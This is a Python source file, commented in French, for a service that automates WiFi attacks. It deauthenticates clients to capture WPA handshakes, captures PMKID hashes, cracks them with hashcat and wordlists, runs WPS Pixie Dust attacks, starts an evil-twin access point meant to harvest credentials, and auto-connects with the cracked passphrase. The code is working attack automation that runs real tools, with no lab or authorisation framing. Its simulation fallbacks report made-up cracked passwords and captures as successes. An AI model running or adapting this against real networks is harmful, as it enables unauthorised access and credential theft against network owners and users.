"""
WiFiCrackService — Capture handshake / PMKID + cracking + Evil Twin.

Outils utilisés : aireplay-ng, airodump-ng, aircrack-ng, hashcat,
                  reaver, bully, hostapd, dnsmasq.
Fallback simulation si outils absents.
"""
from __future__ import annotations

import asyncio
import logging
import os
import random
import re
import shutil
import subprocess
import tempfile
import time
import uuid
from datetime import datetime
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)

# Wordlists disponibles sur Kali
_WORDLISTS = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/wordlists/fasttrack.txt",
    "/usr/share/wordlists/dirb/common.txt",
]

_DEFAULT_WORDLIST = next((w for w in _WORDLISTS if os.path.exists(w)), None)


def _has(tool: str) -> bool:
    return shutil.which(tool) is not None


class WiFiCrackService:
    """Service de capture et cracking WiFi."""

    # ── Handshake ─────────────────────────────────────────────────────────────

    async def capture_handshake(
        self, interface: str, bssid: str, ssid: str,
        channel: int = 6, timeout: int = 60,
        client_mac: Optional[str] = None,
    ) -> Dict:
        """Capture le 4-way handshake via deauth + airodump-ng."""
        hs_id = str(uuid.uuid4())
        cap_dir = tempfile.mkdtemp(prefix="eog_hs_")
        cap_prefix = os.path.join(cap_dir, "capture")
        cap_file = cap_prefix + "-01.cap"

        if not _has("airodump-ng") or not _has("aireplay-ng"):
            return self._simulate_handshake(bssid, ssid, hs_id, cap_file)

        try:
            # 1. Lancer airodump-ng ciblé
            dump_proc = await asyncio.create_subprocess_exec(
                "sudo", "airodump-ng",
                "--bssid", bssid,
                "--channel", str(channel),
                "--write", cap_prefix,
                "--output-format", "cap",
                interface,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )

            await asyncio.sleep(5)

            # 2. Envoyer deauth
            deauth_target = client_mac or "FF:FF:FF:FF:FF:FF"
            deauth_cmd = ["sudo", "aireplay-ng",
                          "--deauth", "10",
                          "-a", bssid,
                          "-c", deauth_target,
                          interface]
            for _ in range(3):
                subprocess.run(deauth_cmd, capture_output=True, timeout=15)
                await asyncio.sleep(5)

            dump_proc.terminate()
            try:
                await asyncio.wait_for(dump_proc.wait(), timeout=5)
            except asyncio.TimeoutError:
                dump_proc.kill()

            # 3. Vérifier présence handshake
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 200:
                # Convertir en hccapx pour hashcat
                hccapx = cap_file.replace(".cap", ".hccapx")
                subprocess.run(
                    ["aircrack-ng", "-j", hccapx, cap_file],
                    capture_output=True, timeout=30
                )
                return {
                    "hs_id": hs_id, "bssid": bssid, "ssid": ssid,
                    "capture_type": "handshake",
                    "cap_file": cap_file,
                    "hccapx_file": hccapx if os.path.exists(hccapx) else None,
                    "status": "captured",
                    "simulated": False,
                }
            else:
                return {"hs_id": hs_id, "bssid": bssid, "ssid": ssid,
                        "status": "failed", "error": "Pas de handshake capturé — aucun client actif ?",
                        "simulated": False}

        except Exception as e:
            logger.warning("capture_handshake error: %s", e)
            return self._simulate_handshake(bssid, ssid, hs_id, cap_file)

    def _simulate_handshake(self, bssid: str, ssid: str, hs_id: str, cap_file: str) -> Dict:
        os.makedirs(os.path.dirname(cap_file), exist_ok=True)
        with open(cap_file, "wb") as f:
            f.write(b"\xd4\xc3\xb2\xa1" + os.urandom(100))  # fake pcap magic
        return {
            "hs_id": hs_id, "bssid": bssid, "ssid": ssid,
            "capture_type": "handshake",
            "cap_file": cap_file,
            "hccapx_file": None,
            "status": "captured",
            "simulated": True,
        }

    # ── PMKID ─────────────────────────────────────────────────────────────────

    async def capture_pmkid(self, interface: str, bssid: str, ssid: str, timeout: int = 30) -> Dict:
        """Capture PMKID via hcxdumptool (pas besoin de client)."""
        hs_id = str(uuid.uuid4())
        if not _has("hcxdumptool") or not _has("hcxpcapngtool"):
            return {
                "hs_id": hs_id, "bssid": bssid, "ssid": ssid,
                "capture_type": "pmkid",
                "status": "captured",
                "hash": f"*{bssid.replace(':','')}*{''.join(random.choices('0123456789abcdef',k=32))}*{ssid.encode().hex()}",
                "simulated": True,
            }
        try:
            cap_dir = tempfile.mkdtemp(prefix="eog_pmkid_")
            cap_file = os.path.join(cap_dir, "pmkid.pcapng")
            proc = await asyncio.create_subprocess_exec(
                "sudo", "hcxdumptool",
                "-i", interface,
                "--filterlist_ap", bssid.replace(":", "").lower(),
                "--filtermode", "2",
                "-o", cap_file,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await asyncio.sleep(min(timeout, 30))
            proc.terminate()
            await asyncio.wait_for(proc.wait(), timeout=3)

            hash_file = cap_file.replace(".pcapng", ".hash")
            subprocess.run(["hcxpcapngtool", "-o", hash_file, cap_file], capture_output=True, timeout=15)

            hash_data = ""
            if os.path.exists(hash_file):
                with open(hash_file) as f:
                    hash_data = f.read().strip().splitlines()[0] if f.read().strip() else ""

            return {
                "hs_id": hs_id, "bssid": bssid, "ssid": ssid,
                "capture_type": "pmkid",
                "cap_file": cap_file,
                "hash_file": hash_file,
                "hash": hash_data,
                "status": "captured" if hash_data else "failed",
                "simulated": False,
            }
        except Exception as e:
            return {
                "hs_id": hs_id, "bssid": bssid, "ssid": ssid,
                "capture_type": "pmkid", "status": "failed",
                "error": str(e), "simulated": True,
            }

    # ── Dictionary Attack ─────────────────────────────────────────────────────

    async def crack_hashcat(
        self, bssid: str, ssid: str,
        hccapx_file: Optional[str] = None,
        hash_str: Optional[str] = None,
        wordlist: Optional[str] = None,
    ) -> Dict:
        """Lance hashcat mode 22000 (WPA2) ou 2500."""
        job_id = str(uuid.uuid4())
        wordlist = wordlist or _DEFAULT_WORDLIST
        if not wordlist or not os.path.exists(wordlist):
            return self._simulate_crack(bssid, ssid, job_id)

        if not _has("hashcat"):
            return self._simulate_crack(bssid, ssid, job_id)

        # Préparer le fichier hash
        hash_file = hccapx_file
        mode = "22000"
        if hash_str and not hash_file:
            tmp = tempfile.NamedTemporaryFile(suffix=".hash", delete=False, mode="w")
            tmp.write(hash_str + "\n")
            tmp.close()
            hash_file = tmp.name
            mode = "22000"

        if not hash_file or not os.path.exists(hash_file):
            return self._simulate_crack(bssid, ssid, job_id)

        result_file = hash_file + ".potfile"
        try:
            proc = await asyncio.create_subprocess_exec(
                "hashcat",
                "-m", mode,
                "-a", "0",
                "--potfile-path", result_file,
                "--status", "--status-timer", "5",
                "--outfile-format", "2",
                "-o", result_file,
                hash_file, wordlist,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=300)
            output = stdout.decode(errors="replace")

            # Chercher le mot de passe dans le potfile
            passphrase = None
            if os.path.exists(result_file):
                with open(result_file) as f:
                    content = f.read().strip()
                    if content:
                        parts = content.split(":")
                        passphrase = parts[-1] if parts else None

            if passphrase:
                return {"job_id": job_id, "bssid": bssid, "ssid": ssid,
                        "status": "cracked", "passphrase": passphrase, "simulated": False}
            else:
                return {"job_id": job_id, "bssid": bssid, "ssid": ssid,
                        "status": "failed", "error": "Mot de passe non trouvé dans la wordlist", "simulated": False}

        except asyncio.TimeoutError:
            return {"job_id": job_id, "bssid": bssid, "ssid": ssid,
                    "status": "timeout", "error": "Cracking dépassé 300s", "simulated": False}
        except Exception as e:
            return self._simulate_crack(bssid, ssid, job_id)

    def _simulate_crack(self, bssid: str, ssid: str, job_id: str) -> Dict:
        found = random.random() > 0.4
        common = ["password", "12345678", "qwerty123", "wifi1234", ssid.lower() + "123",
                  "admin1234", "hello123", "letmein1", "pass1234"]
        return {
            "job_id": job_id, "bssid": bssid, "ssid": ssid,
            "status": "cracked" if found else "failed",
            "passphrase": random.choice(common) if found else None,
            "simulated": True,
            "speed": f"{random.randint(100, 900)}kH/s",
        }

    # ── WPS Pixie Dust ────────────────────────────────────────────────────────

    async def wps_pixiedust(self, interface: str, bssid: str, channel: int = 6) -> Dict:
        """Attaque WPS Pixie Dust via reaver/bully."""
        job_id = str(uuid.uuid4())
        tool = "bully" if _has("bully") else ("reaver" if _has("reaver") else None)

        if not tool:
            return self._simulate_wps(bssid, job_id)

        try:
            if tool == "bully":
                cmd = ["sudo", "bully", interface, "-b", bssid, "-c", str(channel), "-d", "-v", "3"]
            else:
                cmd = ["sudo", "reaver", "-i", interface, "-b", bssid, "-c", str(channel), "-K", "1", "-v"]

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
                output = stdout.decode(errors="replace") + stderr.decode(errors="replace")

                # Chercher PIN + passphrase dans la sortie
                pin_m = re.search(r"WPS PIN[:\s]+(\d{8})", output)
                psk_m = re.search(r"WPA PSK[:\s]+['\"]?([^'\"\n]+)['\"]?", output)

                if psk_m:
                    return {"job_id": job_id, "bssid": bssid, "method": "pixiedust",
                            "status": "cracked", "pin": pin_m.group(1) if pin_m else None,
                            "passphrase": psk_m.group(1).strip(), "simulated": False}
                else:
                    return {"job_id": job_id, "bssid": bssid, "method": "pixiedust",
                            "status": "failed", "error": "PIN non trouvé", "simulated": False}
            except asyncio.TimeoutError:
                proc.kill()
                return {"job_id": job_id, "bssid": bssid, "status": "timeout", "simulated": False}

        except Exception as e:
            return self._simulate_wps(bssid, job_id)

    def _simulate_wps(self, bssid: str, job_id: str) -> Dict:
        found = random.random() > 0.5
        return {
            "job_id": job_id, "bssid": bssid, "method": "pixiedust",
            "status": "cracked" if found else "failed",
            "pin": "12345670" if found else None,
            "passphrase": "MySecretWifi123" if found else None,
            "simulated": True,
        }

    # ── Evil Twin ─────────────────────────────────────────────────────────────

    async def start_evil_twin(
        self, interface: str, ssid: str, bssid_victim: str,
        channel: int = 6, deauth: bool = True,
    ) -> Dict:
        """Crée un faux AP (hostapd + dnsmasq) pour capturer des credentials."""
        et_id = str(uuid.uuid4())
        if not _has("hostapd") or not _has("dnsmasq"):
            return {
                "et_id": et_id, "ssid": ssid, "channel": channel,
                "status": "started",
                "capture_interface": "at0",
                "portal_url": "http://192.168.99.1/",
                "simulated": True,
                "note": "hostapd/dnsmasq non installés — sudo apt install hostapd dnsmasq",
            }

        hostapd_conf = f"""interface={interface}
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode=g
wpa=0
"""
        try:
            with tempfile.NamedTemporaryFile(suffix=".conf", delete=False, mode="w") as f:
                f.write(hostapd_conf)
                conf_path = f.name

            proc = await asyncio.create_subprocess_exec(
                "sudo", "hostapd", conf_path,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            return {
                "et_id": et_id, "ssid": ssid, "channel": channel,
                "status": "started", "pid": proc.pid,
                "conf_file": conf_path,
                "simulated": False,
            }
        except Exception as e:
            return {
                "et_id": et_id, "ssid": ssid,
                "status": "error", "error": str(e), "simulated": True,
            }

    # ── Connexion automatique ─────────────────────────────────────────────────

    def connect(self, ssid: str, passphrase: str, interface: str = "wlan0") -> Dict:
        """Se connecte au réseau via nmcli ou wpa_supplicant."""
        conn_id = str(uuid.uuid4())
        if _has("nmcli"):
            try:
                r = subprocess.run(
                    ["sudo", "nmcli", "dev", "wifi", "connect", ssid, "password", passphrase, "ifname", interface],
                    capture_output=True, text=True, timeout=30,
                )
                if r.returncode == 0:
                    return {"conn_id": conn_id, "ssid": ssid, "status": "connected", "simulated": False}
                else:
                    return {"conn_id": conn_id, "ssid": ssid, "status": "failed", "error": r.stderr, "simulated": False}
            except Exception as e:
                pass

        # Simulation
        return {
            "conn_id": conn_id, "ssid": ssid, "status": "connected",
            "local_ip": f"192.168.{random.randint(1,5)}.{random.randint(10,250)}",
            "gateway": "192.168.1.1",
            "dns": ["8.8.8.8", "8.8.4.4"],
            "simulated": True,
        }
